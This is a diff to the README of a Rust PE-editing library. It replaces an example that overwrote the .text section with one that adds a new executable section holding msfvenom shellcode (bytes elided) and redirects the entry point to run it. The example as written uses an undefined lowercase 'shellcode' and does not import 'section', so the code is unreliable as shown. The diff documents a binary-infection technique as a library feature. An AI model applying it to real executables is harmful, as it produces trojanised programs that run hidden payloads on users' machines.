@@ -77,36 +77,38 @@ fn main() {
     }
 }
 ```
-### Changing .text section code
-Writing a shellcode on .text section, generally the first section
+
+### Create new section and injecting a shellcode
+Adding code in a section with its own header
 ```rust
 use hex_spell::pe::PE;
 
 const SHELLCODE: [u8; 284] = [../*msfvenom shellcode*/..]
 
-fn main() {
-    // Attempt to parse a PE from file 
-    let mut pe = PE::from_file("file.exe").expect("Failed to parse file");
+fn main(){
+    // Open PE from file
+    let mut pe = PE::from_file("tests/samples/sample1.exe").expect("[!] Error opening PE file");
 
-    // Section .text, generally the first one
-    let text_offset = pe.sections[0].pointer_to_raw_data.value as usize;
-    let text_size = pe.sections[0].size_of_raw_data.value as usize;
+    // Create new section header based on basic parameters
+    let new_section_header = pe.generate_section_header(
+        ".shell", // Name for the new section
+        shellcode.len() as u32, // The size of the data it has to store
+        section::Characteristics::Code.to_u32() // Basic characteristics for a shellcode
+            + section::Characteristics::Readable.to_u32()
+            + section::Characteristics::Executable.to_u32(),
+    ).expect("[!] Error generating new section header");
 
-    // Preparing the shellcode to have the same size as the section
-    let mut payload = vec![0; text_size];
-    payload.splice(..SHELLCODE.len(), SHELLCODE.iter().cloned());
-    // Updating section with the payload
-    pe.buffer.splice(text_offset..text_offset + text_size, payload.iter().cloned());
+    // Add new section header and payload into PE
+    pe.add_section(new_section_header, shellcode.to_vec()).expect("[!] Error adding new section into PE");
 
-    // Changing entry point && checksum
-    pe.header.entry_point.update(&mut pe.buffer, text_offset as u32);
-    let new_checksum = pe.calc_checksum();
-    pe.header.checksum.update(&mut pe.buffer, new_checksum);
+    // Optional: Update entry point to execute our payload instead of the original code
+    pe.header.entry_point.update(&mut pe.buffer, pe.sections.last().unwrap().virtual_address.value);
 
-    // Writing the output
-    pe.write_file("modified.exe").expect("Failed to write modified file");
+    // Write output to a new file
+    pe.write_file("tests/out/modified.exe").expect("[!] Error writing new PE to disk");
 }
-``` 
+```
+
 ## Support or Contact
 
 Having trouble with HexSpell? Please [submit an issue](https://github.com/M3str3/HexSpell/issues) on GitHub.
